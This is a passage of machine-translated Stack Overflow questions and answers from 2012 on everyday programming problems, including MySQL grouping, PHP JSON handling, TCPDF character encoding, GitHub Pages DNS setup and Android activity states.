> 时间：2012-05-21T13:15:01.267

添加`c.id`到您的`SELECT`列表和`GROUP BY`。这将导致`SUM(a.is_correct)`跨类别 ID 进行分组。

```
SELECT
  u.`user_name` AS `UserName`,
  u.`user_id`   AS `UserId`,
  /* CategoryId into the SELECT list */
  c.id AS `CategoryId`,
  sum(a.is_correct) AS `Score`,
  group_concat(distinct c.name) AS `Quizes`
FROM users_answers ua
  LEFT JOIN answers a
    on a.id = ua.answer_id
  LEFT JOIN users u
    ON u.user_id = ua.user_id
  left join questions q
    on q.id = a.question_id
  left join categories c
    on c.id = q.cat_id
WHERE a.is_correct = 1
/* And add it to the GROUP BY */
GROUP BY 
  u.user_id,
  CategoryId
ORDER BY `Score` desc, ua.date desc, CategoryId; 
```

### 更新

在评论中澄清问题后，将整个事情包装在一个子查询中，并调用`GROUP_CONCAT()`总和：

```
SELECT
  subq.UserName,
  subq.UserId,
  GROUP_CONCAT(CONCAT(CategoryName, ': ', Score)) AS CategoryScores,
  Quizzes
FROM (
    SELECT
      u.`user_name` AS `UserName`,
      u.`user_id`   AS `UserId`,
      /* CategoryId into the SELECT list */
      c.id AS `CategoryId`,
      c.name AS `CategoryName`,
      sum(a.is_correct) AS `Score`,
      group_concat(distinct c.name) AS `Quizes`
    FROM users_answers ua
      LEFT JOIN answers a
        on a.id = ua.answer_id
      LEFT JOIN users u
        ON u.user_id = ua.user_id
      left join questions q
        on q.id = a.question_id
      left join categories c
        on c.id = q.cat_id
    WHERE a.is_correct = 1
    /* And add it to the GROUP BY */
    GROUP BY 
      u.user_id,
      CategoryId,
      CategoryName
) subq
GROUP BY UserId
ORDER BY `Score` desc, ua.date desc; 
```

# mongodb - Windows7 上 Elasticsearch 与 mongoDB 的集成

> ID：10685937
> 
> 赞同：0
> 
> 时间：2012-05-21T13:12:29.017
> 
> 标签：mongodb, elasticsearch

当我跑步时

```
 curl -XPUT 'http://localhost:9200/_river/test/_meta' -d '{
    "type": "mongodb",
    "mongodb": {
        "db": "test",
        "collection": "es_test"
    },
    "index": {
        "name": "mongoindex",
        "type": "es_test"
    }
}' 
```

我收到以下异常：

```
 {"error":"MapperParsingException[Failed to parse]; nested:JsonParseException[Unexpected character ('m' (code 109)): expected a valid value (number,String, array, object, 'true', 'false' or 'null')\n at [Source:[B@61f133ea; line:1, column:8]]; ","status":400} 
```

我自己进行了研究，发现这个[弹性搜索用户](http://elasticsearch-users.115913.n3.nabble.com/Ultra-slow-indexing-td3672298.html)和[MongoDB River Plugin for ElasticSearch](https://github.com/richardwilly98/elasticsearch-river-mongodb) ...试图按所示实现，但有同样的错误......如果有人有在 Windows7 环境中使用 ES 的经验，请指出我做错了什么？我是 ElasticSearch 的新手，非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T17:03:06.510

这个对我有用。也许你在打字时在你的 shell 中有一个假字符？尝试将它放在一个文件中并使用 shell 运行它。

# php - GWT + PHP，管理 JSON

> ID：10685939
> 
> 赞同：0
> 
> 时间：2012-05-21T13:12:39.850
> 
> 标签：php, gwt

我正在尝试将 GWT 与 PHP 后端连接；我使用提供的教程成功地在前端加载了一些数据：[https](https://developers.google.com/web-toolkit/doc/latest/DevGuideServerCommunication#DevGuideHttpRequests) ://developers.google.com/web-toolkit/doc/latest/DevGuideServerCommunication#DevGuideHttpRequests ；现在我正在尝试使用提供的同一段代码将数据从 GWT 发送到 PHP，但我不知道如何修改它。在我完成的 Java GWT 类中

```
RequestBuilder builder = new RequestBuilder(RequestBuilder.POST, URL.encode(url));
    builder.setHeader("Content-Type", "application/json");
    try {
          Request request = builder.sendRequest("{\"data\":\"hello\"}", new RequestCallback() { ... 
```

然后在php脚本中

```
echo json_decode($_POST); 
```

但错误是“[INFO] [testapp] - **警告**：json_decode() 期望参数 1 是字符串，第**25**行**C:\xampp\htdocs\TestApp\TestApp.php**中给出的数组”

 **任何人都可以提供这种情况的工作示例吗？或者链接我一些教程或文档，更多地讨论如何将 GWT 与 PHP 一起使用？官网里没有这么多。。。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:29:56.330

```
echo json_decode($HTTP_ROW_POST_DATA); 
```

或者

```
echo json_decode(file_get_contents("php://input")) 
```

见[http://php.net/manual/en/reserved.variables.httprawpostdata.php](http://php.net/manual/en/reserved.variables.httprawpostdata.php)和[http://php.net/manual/en/wrappers.php.php](http://php.net/manual/en/wrappers.php.php)（后者应该是首选）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:45:30.867

sendRequest 获取数据并将数据作为数组发送。你必须用来`json_decode(parse_str($_POST['data']))`接收请求数据

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:15:11.447

尝试这个：

```
<?php
echo json_decode($_POST['data']); 
```

因为你想解码你的`data`参数，而不是所有发布的参数。**

# jquery - 您使用哪个 jQuery“就地编辑”插件？

> ID：10685953
> 
> 赞同：0
> 
> 时间：2012-05-21T13:13:50.717
> 
> 标签：jquery

我需要为表格实现一些就地编辑功能（单击编辑按钮时，每个表格单元格（在该行中）将变成文本框/文本区域，然后单击保存按钮时，更新数据库并更改字段返回文本。

显然我将处理 AJAX 编辑/更新部分，但什么是“最好的”就地编辑 jQuery 插件？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:16:06.690

[Datatables](http://datatables.net)有一个[可编辑的插件](http://code.google.com/p/jquery-datatables-editable/)

支持

*   向表中添加新记录
*   选择和删除记录
*   编辑单元格

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T13:17:38.273

Jeditable 插件是我用过的最好的插件：http: [//www.appelsiini.net/projects/jeditable](http://www.appelsiini.net/projects/jeditable)

# servlets - 仅过滤子目录下的 JSP

> ID：10685958
> 
> 赞同：1
> 
> 时间：2012-05-21T13:14:00.927
> 
> 标签：servlets, servlet-filters

我在名为 test 的文件夹下有一组 JSP，我的 Web 内容根目录是 app。我想只为那些被测试的 JSP 设置一个过滤器。我尝试使用过滤器 url 模式

```
/app/test/* 
```

和

```
/*test/* 
```

两者都没有触发过滤器。有人可以帮我解决问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:22:03.643

URL 模式不应包含上下文根。它已经相对于上下文根。

使用`/test/*`.

```
<url-pattern>/test/*</url-pattern> 
```

# xpages - IE 兼容模式会导致 XPages DateTimePicker 出现问题

> ID：10685959
> 
> 赞同：1
> 
> 时间：2012-05-21T13:14:05.177
> 
> 标签：xpages

Per Henrik 建议使用 xPage 扩展解决 IE 中奇怪的拉伸对话框问题。

[修复 IE 中“拉伸”的 XPage 扩展库名称选择器？](https://stackoverflow.com/questions/10606922/fixing-stretched-xpage-extension-library-name-picker-in-ie)

这很好用并解决了问题。但这会导致 DateTimePicker 出现问题。在兼容模式下，DateTimePicker 的日历会显示，但会立即关闭。我在这里整理了一个演示：

```
 <xp:this.beforeRenderResponse>
    <![CDATA[#{javascript:  if (context.getUserAgent().isIE()) {
    var response = facesContext.getExternalContext().getResponse();
    response.setHeader("X-UA-Compatible", "IE=8");
}}]]>
</xp:this.beforeRenderResponse>

<xp:inputText id="inputText1">
    <xp:dateTimeHelper id="dateTimeHelper1"></xp:dateTimeHelper>
    <xp:this.converter>
        <xp:convertDateTime type="date"></xp:convertDateTime>
    </xp:this.converter>
</xp:inputText> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T14:34:39.070

我偶然发现了完全相同的问题。我的修复受到[Paul Withers 关于该主题的博客文章的](http://www.intec.co.uk/xpages-date-picker-my-preference/)启发，涉及使用 Dojo DateTextBox 和 TimeTextBox for IE。

我使用标准日期字段：

```
<xp:inputText id="FejlDato" value="#{document.FejlDato}">
    <xp:this.converter>
        <xp:convertDateTime type="date"></xp:convertDateTime>
    </xp:this.converter>
    <xp:dateTimeHelper></xp:dateTimeHelper>
</xp:inputText> 
```

并在时间字段中添加主题 ID，以便在主题中定位它们：

```
<xp:inputText id="FejlTid" value="#{document.FejlTid}">
    <xp:this.converter>
        <xp:convertDateTime type="time"></xp:convertDateTime>
    </xp:this.converter>
    <xp:this.themeId><![CDATA[${javascript:if (context.getUserAgent().isIE()) { "InputField.TimePicker" }}]]></xp:this.themeId>
    <xp:dateTimeHelper></xp:dateTimeHelper>
</xp:inputText> 
```

然后，我在主题中使用以下内容来为 IE 使用 dijit.form.DateTextBox 和 dijit.form.TimeTextBox 而不是标准的 XPages 日期和时间选择器：

```
<!-- DatePicker for IE8 and IE9 -->
<resources>
    <dojoModule rendered="#{javascript:context.getUserAgent().isIE()}">
        <name>dijit.form.DateTextBox</name>
     </dojoModule>
     <dojoModule rendered="#{javascript:context.getUserAgent().isIE()}">
        <name>dijit.form.TimeTextBox</name>
     </dojoModule>
</resources>
<control>
    <name>InputField.DateTimePicker</name>
    <property>
        <name>dojoType</name>
        <value>#{javascript:context.getUserAgent().isIE()?'dijit.form.DateTextBox':''}</value> 
    </property>
</control>
<control>
    <name>InputField.TimePicker</name>
    <property>
        <name>dojoType</name>
        <value>#{javascript:context.getUserAgent().isIE()?'dijit.form.TimeTextBox':''}</value> 
    </property>
</control> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-29T20:25:06.933

我只是使用了 dojo 日期选择器，它似乎对我有用。没有理由让主题参与进来。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T07:53:37.327

IE9 工作正常，但如果你打开兼容模式就不行了…… IE 科幻

# github - 通过 DNS 的多个 GitHub 页面和自定义域

> ID：10685961
> 
> 赞同：80
> 
> 时间：2012-05-21T13:14:14.177
> 
> 标签：github, dns, subdomain, cname, github-pages

我想要一个用户页面和多个项目页面由[GitHub Pages](http://help.github.com/pages)托管，但在一个自定义域下可用**（**当然，每个 GitHub Pages 存储库都有子域）。所以我的目标如下：

*   [在http://blog.florianwolters.de、http](http://blog.florianwolters.de) : [//www.florianwolters.de](http://www.florianwolters.de)和[http://florianwolters.de](http://florianwolters.de)下提供一个用户页面 ( [http://florianwolters.github.com](http://florianwolters.github.com) ) 。
*   尽可能多的项目页面（例如[http://florianwolters.github.com/pear](http://florianwolters.github.com/pear)在[http://pear.florianwolters.de](http://pear.florianwolters.de)下可用。

据我目前的理解，GitHub Pages 只允许在**Git**`CNAME`存储库的根文件中定义的页面（用户页面和项目页面）的一个 CNAME 资源记录。我已经尝试了很多事情（在我的域提供商[EUserv](http://euserv.com)使用 DNS 记录和标头重定向，但我只能通过一个 URL（[http://blog.florianwolters.de](http://blog.florianwolters.de)）访问我的 GitHub 用户页面。我知道 DNS更改可能需要两天时间。

有人可以向我解释一下，我如何才能实现上述目标？我不敢相信这是不可能的，但我也不是 DNS 等方面的专家。

如果上述情况不可行：您建议的解决方法是什么？我确实想访问一个域下的所有 GitHub 页面（以及该域的子域）。

# 资源

*   [http://help.github.com/pages/](http://help.github.com/pages/)
*   [GitHub 项目页面的自定义域](https://stackoverflow.com/questions/9082499/custom-domain-for-github-project-pages)
*   [https://groups.google.com/forum/?fromgroups#!topic/github/AaAuoDK44Ag](https://groups.google.com/forum/?fromgroups#!topic/github/AaAuoDK44Ag)
*   [https://github.com/blog/315-cname-support-for-github-pages](https://github.com/blog/315-cname-support-for-github-pages)
*   [http://code.lancepollard.com/custom-domain-github-pages](http://code.lancepollard.com/custom-domain-github-pages)

* * *

## 回答 #1

> 赞同：78
> 
> 时间：2012-05-22T12:44:41.810

你能行的。请注意，所有 DNS CNAME 入口都指向同一主机。

1：github.com/florianwolters/florianwolters.github.com

CNAME 文件内容：`blog.florianwolters.de`

DNS CNAME：博客 > **florianwolters.github.com**

2：github.com/florianwolters/pear/tree/gh-pages

CNAME 文件内容：`pear.florianwolters.de`

DNS CNAME：梨 > **florianwolters.github.com**

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-26T13:32:40.960

您可以将**一条** *CNAME*资源记录*或* **一条** *A*资源记录与[GitHub Pages](http://pages.github.com)一起使用。

因此，总而言之，必须决定：

*   您要么使用`example.org`and (用)`www.example.org`替换现有*的 A 记录*`204.232.175.78`...
*   ... 或子域，例如（使用`blog.example.org`创建新的*CNAME 记录*`<username>.github.com`）。

现在，您必须选择如何从一个（子）域映射到另一个域：

*   如果使用第一个，您可以使用从所需子域到`example.org`.
*   如果使用后者，您必须使用从`example.org`和`www.example.org`到所需子域的标头重定向。

此外，请参阅[GitHub Pages 帮助](http://help.github.com/pages)以获取帮助，并参阅我的[GitHub Pages 存储库](http://github.com/FlorianWolters/florianwolters.github.com)以获取示例`CNAME`文件。

**编辑： GitHub Pages 添加了一个详细的页面，描述了如何**[在此处](https://help.github.com/articles/setting-up-a-custom-domain-with-pages)设置自定义域。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-04-26T08:21:15.410

对于在 Git 存储库根目录中的 CNAME 文件中定义的页面（用户页面和项目页面），您只能有一个 CNAME 资源记录。

您可以通过在指向 florianwolters.github.com 的 DNS 设置中为您的主机（pear）创建 CNAME 记录并在 pear.florianwolters.de 存储库中的 CNAME 文件中创建条目来规避此问题

# php - 为什么我不能在 TCPDF 表中使用 č,ć,đ 宪章？

> ID：10685964
> 
> 赞同：3
> 
> 时间：2012-05-21T13:14:26.120
> 
> 标签：php, html, tcpdf

我正在为我的网站构建一个 tcpdf 文件，在那个 tcpdf 文件中有一个包含一些数据的表格，但是我无法让这个章程正常工作。对于编码，我使用的是 windows-1250。宪章女巫不起作用：č，ć，đ。我已经尝试过使用 utf-8 但仍然没有得到这个章程 tcpdf 有什么问题吗？

这是我的php：

```
 <?php

require_once('tcpdf_files/config/lang/hrv.php');
require_once('tcpdf_files/tcpdf.php');

// create new PDF document
$pdf = new TCPDF(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, false, 'windows-1250', false);

// set document information
$pdf->SetCreator(PDF_CREATOR);
$pdf->SetAuthor('Nicola Asuni');
$pdf->SetTitle('TCPDF Example 061');
$pdf->SetSubject('TCPDF Tutorial');
$pdf->SetKeywords('TCPDF, PDF, example, test, guide');

// set default header data
$pdf->SetHeaderData(PDF_HEADER_LOGO, PDF_HEADER_LOGO_WIDTH, PDF_HEADER_TITLE.' 061', PDF_HEADER_STRING);

// set header and footer fonts
$pdf->setHeaderFont(Array(PDF_FONT_NAME_MAIN, '', PDF_FONT_SIZE_MAIN));
$pdf->setFooterFont(Array(PDF_FONT_NAME_DATA, '', PDF_FONT_SIZE_DATA));

// set default monospaced font
$pdf->SetDefaultMonospacedFont(PDF_FONT_MONOSPACED);

//set margins
$pdf->SetMargins(PDF_MARGIN_LEFT, PDF_MARGIN_TOP, PDF_MARGIN_RIGHT);
$pdf->SetHeaderMargin(PDF_MARGIN_HEADER);
$pdf->SetFooterMargin(PDF_MARGIN_FOOTER);

//set auto page breaks
$pdf->SetAutoPageBreak(TRUE, PDF_MARGIN_BOTTOM);

//set image scale factor
$pdf->setImageScale(PDF_IMAGE_SCALE_RATIO);

//set some language-dependent strings
$pdf->setLanguageArray($l);

// ---------------------------------------------------------

// set font
$pdf->SetFont('times', '', 10);

// add a page
$pdf->AddPage();

//START OF DATA FOR PDF DOSJE

         $ime = "šiš čevap";
         $prezime = "čušpaiz";
         $rodjenje = "čakardič";
         $odjel = "četnik";
         $radno_mjesto = "čaćijađ";
         $poduzece = "čitluk";
         $putovnica = "čošak";
         $vozacka = "pićkica";

$html = <<<EOF
<!-- EXAMPLE OF CSS STYLE -->
<table width="100%" style="padding:3px;">
<tr>

<td>

    <table border="1" style="border:1px solid grey; width:60%;">

            <tr>

                <td rowspan="3">
                <p style="margin-top:-38px;">POSLODAVAC:</p>
                </td>

                <td>
                Ime firme
                </td>
            </tr>

            <tr>        

                <td>
                    adresa firme
                </td>
            </tr>

            <tr>        

                <td>
                    oib firme
                </td>
            </tr>
    </table><br>

    <table  border="1" style="border:1px solid #dddddd; width:60%;">    
            <tr>            
                <td>
                RADNIK: 
                </td>

                <td>
                $ime $prezime
                </td>
            </tr>

            <tr>        
                <td>
                Oib
                </td>

                <td>
                $rodjenje
                </td>
            </tr>

            <tr>        
                <td>
                Spol
                </td>

                <td>
                $odjel
                </td>
            </tr>

            <tr>        
                <td>
                Dan, mjesec i godina rođenja
                </td>

                <td>
                $radno_mjesto
                </td>
            </tr>

            <tr>        
                <td>
                Državljanstvo
                </td>

                <td>
                $radno_mjesto
                </td>
            </tr>
        </table><br>

EOF;

// output the HTML content
$pdf->writeHTML($html, true, false, true, false, '');

// reset pointer to the last page
$pdf->lastPage();

//Close and output PDF document
$pdf->Output('example_061.pdf', 'I'); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-12T19:01:20.437

它不适用于 times 字体。我们的信件使用这种字体：

```
$pdf->SetFont('dejavusans', '', 11, '', true); 
```

和 UTF-8

**编辑** 一段时间后，我认为这更好：

```
$pdf->SetFont('freeserif', '', 11, '', true); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-27T05:43:17.740

我不确定它是否会起作用，但请尝试`iconv`. 我在制作日文 PDF 时不得不使用它。我不知道您的编码需要是什么，但这是我使用的：

```
$newtext = iconv("UTF-8", "SJIS", $oldtext); 
```

显然将“SJIS”更改为您使用的任何编码。

**编辑**

只是重复我在下面的评论中所说的话，但希望在这里更容易阅读：

尝试将第四个构造函数变量更改为`TRUE`，因此它使用 UTF-8：

```
$pdf = new TCPDF(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, false, 'windows-1250', false);
                                                                    ⇓
$pdf = new TCPDF(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, true, 'windows-1250', false); 
```

如果这不起作用，我不知道该告诉你什么：-/

**编辑（再次）**

可能是一个愚蠢的问题，但你看过这些例子吗？

[http://www.tcpdf.org/examples/example_018.phps](http://www.tcpdf.org/examples/example_018.phps)

没有什么可以帮助你的吗？

**另一个编辑**

好的，希望这应该做到：

```
<?php 

require_once('tcpdf/config/lang/hrv.php'); 
require_once('tcpdf/tcpdf.php'); 

// create new PDF document 
$pdf = new TCPDF(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, true, 'utf-8', false);

// set document information 
$pdf->SetCreator(PDF_CREATOR); 
$pdf->SetAuthor('Nicola Asuni'); 
$pdf->SetTitle('TCPDF Example 061'); 
$pdf->SetSubject('TCPDF Tutorial'); 
$pdf->SetKeywords('TCPDF, PDF, example, test, guide'); 

// set default header data 
$pdf->SetHeaderData(PDF_HEADER_LOGO, PDF_HEADER_LOGO_WIDTH, PDF_HEADER_TITLE.' 061', PDF_HEADER_STRING); 

// set header and footer fonts 
$pdf->setHeaderFont(Array(PDF_FONT_NAME_MAIN, '', PDF_FONT_SIZE_MAIN)); 
$pdf->setFooterFont(Array(PDF_FONT_NAME_DATA, '', PDF_FONT_SIZE_DATA)); 

// set default monospaced font 
$pdf->SetDefaultMonospacedFont(PDF_FONT_MONOSPACED); 

//set margins 
$pdf->SetMargins(PDF_MARGIN_LEFT, PDF_MARGIN_TOP, PDF_MARGIN_RIGHT); 
$pdf->SetHeaderMargin(PDF_MARGIN_HEADER); 
$pdf->SetFooterMargin(PDF_MARGIN_FOOTER); 

//set auto page breaks 
$pdf->SetAutoPageBreak(TRUE, PDF_MARGIN_BOTTOM); 

//set image scale factor 
$pdf->setImageScale(PDF_IMAGE_SCALE_RATIO); 

//set some language-dependent strings 
$pdf->setLanguageArray($l); 

// --------------------------------------------------------- 

// set font 
$pdf->SetFont('freesans', '', 10); 

// add a page 
$pdf->AddPage(); 

//START OF DATA FOR PDF DOSJE 

  $ime = "šiš čevap";
  $prezime = "čušpaiz";
  $rodjenje = "čakardič";
  $odjel = "četnik";
  $radno_mjesto = "čaćijađ";
  $poduzece = "čitluk";
  $putovnica = "čošak";
  $vozacka = "pićkica";

$html = <<<EOF
<!-- EXAMPLE OF CSS STYLE --> 
<table width="100%" style="padding:3px;"> 
  <tr>
    <td>
      <table border="1" style="border:1px solid grey; width:60%;"> 
        <tr>
          <td rowspan="3"> 
            <p style="margin-top:-38px;">POSLODAVAC:</p> 
          </td>
          <td>
            Ime firme
          </td>
        </tr>
        <tr>
          <td>
            adresa firme
          </td>
        </tr>
        <tr>
          <td>
            oib firme
          </td>
        </tr>
      </table>
      <br>
      <table  border="1" style="border:1px solid #dddddd; width:60%;">     
        <tr>             
          <td> 
            RADNIK:  
          </td>
          <td> 
            $ime $prezime 
          </td> 
        </tr>
        <tr>         
          <td> 
            Oib
          </td>
          <td>
            $rodjenje
          </td>
        </tr>
        <tr>
          <td> 
            Spol 
          </td>
          <td>
            $odjel
          </td> 
        </tr>
        <tr>         
          <td>
            Dan, mjesec i godina rođenja 
          </td>
          <td>
            $radno_mjesto
          </td>
        </tr>
        <tr>
          <td>
            Državljanstvo
          </td>
          <td>
            $radno_mjesto 
          </td>
        </tr>
      </table>
      <br> 
    </td>
  </tr>
</table>

EOF;

// output the HTML content 
$pdf->writeHTML($html, true, false, true, false, ''); 

// reset pointer to the last page 
$pdf->lastPage(); 

//Close and output PDF document 
$pdf->Output('example_061.pdf', 'I');

?> 
```

如果您使用 1250 编码数据库中的值，则需要像这样转换它们：

```
$db = mysql_connect('localhost', 'user', 'password');
mysql_select_db('databasename', $db);
mysql_set_charset("cp1250");

$query = mysql_query("SELECT * FROM `yourtable`");

while ($row = mysql_fetch_assoc($query)) {
  $converted_value = iconv("windows-1250", "utf-8", $row['column_name']);
} 
```

我在自己的数据库中制作了一个 1250 排序规则的测试表，并使用了您提供的单词。这对我有用。让我知道它是否有帮助！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-21T13:35:37.377

尝试使用mPDF，理解起来更方便，更清晰（[mPDF](http://www.mpdf1.com/mpdf/)）示例：

```
 require(LIBRARY . "/MPDF54/mpdf.php");

            $mpdf=new mPDF('c','A4-L','','',10,10,20,15,5,5, 'L');
            $mpdf->SetDisplayMode('fullpage');
            $mpdf->list_indent_first_level = 0;

                $header = $view->render('header.phtml');    
            $mpdf->SetHTMLHeader($header);
                $footer = $view->render('footer.phtml');
            $mpdf->SetHTMLFooter($footer);

                $view->client_info = $client_info[0];
                $view->info = $info;
                $view->lots = $lots;
                $html = $view->render('invoice.phtml'); 

            $mpdf->WriteHTML($html,2);
            $mpdf->Output("bidder_$id.pdf",'I');
            exit; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-01-14T16:48:49.137

我有同样的问题，一些提示：

就像在其他答案中检查你的字体一样，它必须是 unicode ...

然后，检查您的编码：

你可以这样做：mb_detect_encoding。

像这样 ：

```
$x=$row['adresa']; // $x=test

  echo mb_detect_encoding($x);

  echo $x; 
```

最终结果将是等。: UTF-8 测试

如果不是 Utf-8 Tcpdf 将显示空白页。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-21T13:42:43.767

你不能只使用这样的代码：

```
č = &#269;
ć = &#263;
đ = &#273; 
```

?

我个人对 mPDF 也有更好的体验。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2015-03-11T15:39:30.700

```
SetCreator(PDF_CREATOR); 
$pdf->SetAuthor('Nicola Asuni'); 
$pdf->SetTitle('TCPDF Example 048'); 
$pdf->SetSubject('TCPDF Tutorial'); 
$pdf->SetKeywords('TCPDF, PDF, example, test, guide'); 
$pdf->SetHeaderData(PDF_HEADER_LOGO, PDF_HEADER_LOGO_WIDTH, PDF_HEADER_TITLE.': Naziv Udruge', PDF_HEADER_STRING); 
$pdf->setHeaderFont(Array(PDF_FONT_NAME_MAIN, '', PDF_FONT_SIZE_MAIN)); $pdf->setFooterFont(Array(PDF_FONT_NAME_DATA, '', PDF_FONT_SIZE_DATA)); $pdf->SetDefaultMonospacedFont(PDF_FONT_MONOSPACED); 
$pdf->SetMargins(PDF_MARGIN_LEFT, PDF_MARGIN_TOP, PDF_MARGIN_RIGHT); 
$pdf->SetHeaderMargin(PDF_MARGIN_HEADER); 
$pdf->SetFooterMargin(PDF_MARGIN_FOOTER); 
$pdf->SetAutoPageBreak(TRUE, PDF_MARGIN_BOTTOM); 
$pdf->setImageScale(PDF_IMAGE_SCALE_RATIO); 
if (@file_exists(dirname(__FILE__).'/lang/hrv.php')) { require_once(dirname(__FILE__).'/lang/hrv.php'); 
$pdf->setLanguageArray($l); 
} 
// --------------------------------------------------------- 
$pdf->SetFont('freesans', '', 12); 
$pdf->AddPage(); 
$pdf->Write(0, 'Lista čćšđžlanova', '', 0, 'L', true, 0, false, false, 0); $pdf->SetFont('freesans', '', 8); 
// ----------------------------------------------------------------------------- 
$tbl = ' '; 
mysql_set_charset("cp1250"); 
$rezultat = mysql_query("SELECT * FROM tbl_contacts WHERE contact_id > 0"); 
while ($row = mysql_fetch_array($rezultat)) { 
$ime=$row['first_name']; 
$ime2 = iconv("windows-1250", "utf-8", $ime);
$tbl=$tbl.' '; 
} $tbl=$tbl.'
Ime i prezime   Datum rođenjačćšđž  Adresa'.$ime2.'nn   BLA BLA BLA BLA';
$pdf->writeHTML($tbl, true, false, false, false, ''); 
// ----------------------------------------------------------------------------- 
$pdf->Output('Lista.pdf', 'I'); 
?> 
```

# ruby-on-rails - RoR Sorcery GEM登录不想工作

> ID：10685970
> 
> 赞同：1
> 
> 时间：2012-05-21T13:14:38.580
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, rubygems

所以我在 RoR 有这个项目，我使用魔法 gem 进行注册和登录，

我的注册器运行良好，我看到数据库中的数据已添加，但是当我尝试使用相同的数据登录时，它以某种方式无法识别数据。

这是我在登录教程中使用的功能。

```
 def logins
  user = login(params[:username], params[:password], params[:remember_me])
  if user
    redirect_back_or_to root_url, :notice => "Logged in!"
  else
    flash.now.alert = "Email or password was invalid"
    render :new
  end
end 
```

我确定我输入了正确的用户名和密码，但它仍然总是显示电子邮件或密码无效。

任何建议将不胜感激，因为我没有想法:(。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:40:09.683

可能是您发布到“登录”操作：电子邮件而不是参数中的：用户名选项？检查您的请求日志。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T16:19:24.033

由于您的参数是这样的：`"user"=>{"username"=>"drakelv", "password"=>"[FILTERED]"}`，您应该调用`user = login(params['user']['username] ... )`而不是`user = login(params[:username], params[:password], params[:remember_me])`. 也许`login(params['user'])`也会起作用。

# java - 使用Java逐字节读取文件的非预期字节

> ID：10685971
> 
> 赞同：2
> 
> 时间：2012-05-21T13:14:38.640
> 
> 标签：java, file

我正在尝试按字节读取一些文件。问题是 Java 向我显示的字节不同，我可以使用 Far hex 编辑器读取。

使用 Far 读取字节：00 00 00 17 00 00 00 29 00 00 00 99 00 00 00 9B

使用 Java 读取字节：0 0 0 17 0 0 0 29 0 0 0 22 0 0 0 3a

Java代码：

```
while ((line = (byte) _br.read()) != -1) {
    lines.add(line);
    System.out.println("lines = " + Integer.toHexString(line));
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:44:46.347

您过早地将返回的整数转换`read()`为字节。这会导致溢出，并可能阻止 -1 文件结束检查工作（在您当前的问题之上）。它说返回的值在 0 到 65535 之间的文档（不能由字节变量处理）。在 java 中，字节是有符号的 8 位值，因此只要值大于 0x7F，就会出现问题。将变量类型更改`line`为 int 并重试。

# android - Android Activity active 和 running 的区别

> ID：10685973
> 
> 赞同：1
> 
> 时间：2012-05-21T13:14:47.103
> 
> 标签：android, android-activity, android-lifecycle

[我正在阅读 Android 开发者网站](http://developer.android.com/reference/android/app/Activity.html)上的 Android 文档，并在 Android 活动生命周期附近阅读了以下内容：

```
If an activity in the foreground of the screen (at the top of the stack), it is active or running. 
```

主动和跑步有什么区别？它说它们都在屏幕的前景，所以我看不出这些状态之间的真正区别。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:18:09.847

一个活动仍然可以*运行*，但它不是*活动*的，只要它仍然在屏幕上可见，但被另一个活动部分遮挡。

# jquery - jQuery UI Autocomplete - 工具提示显示列表中的所有条目，即使不匹配

> ID：10685975
> 
> 赞同：2
> 
> 时间：2012-05-21T13:14:51.953
> 
> 标签：jquery, user-interface, autocomplete

自动完成气泡出现了，但是当我在输入中输入内容时，工具提示显示列表中的所有条目，即使不匹配...例如。我可以输入：“aaaazzzz”并且仍然有自动完成气泡（在列表中没有这样的字符串）...... users.txt 中有超过 1600 个用户/元素 - 但即使我将列表减少到 5 个条目也会出现问题。我的脚本是：

```
$( "#userLogin" ).autocomplete({
    source: 'users.txt'
}); 
```

用户.txt：

```
["user1","user2","user3"] 
```

相关：[jQuery UI Autocomplete - 从 txt 文件中获取数据](https://stackoverflow.com/questions/10682901/jquery-ui-autocomplete-get-data-from-txt-file)

请指教。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-02T11:10:46.997

Jquery 不适用于 txt 文件，您需要先将 txt 文件中的数据分解为一个数组，然后将该数组用作源：

```
 var availableTags;
    $.get("Array.txt", function(data) {
        availableTags = data.split(',');
         $( "#tags" ).autocomplete({source:availableTags})
     }); 
```

# android - 基于相同的代码为 iOS、Android 和 WP7 创建库

> ID：10685984
> 
> 赞同：2
> 
> 时间：2012-05-21T13:15:19.217
> 
> 标签：android, ios, windows-phone-7, cross-platform

我已经在三个平台上用适当的语言编写了现有的应用程序：Objective C、Java 和 C#，但这些应用程序的大部分都是相同的。

那么是否可以使用跨平台之一创建一个 .DLL 并将其导入我的应用程序中？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T13:43:59.313

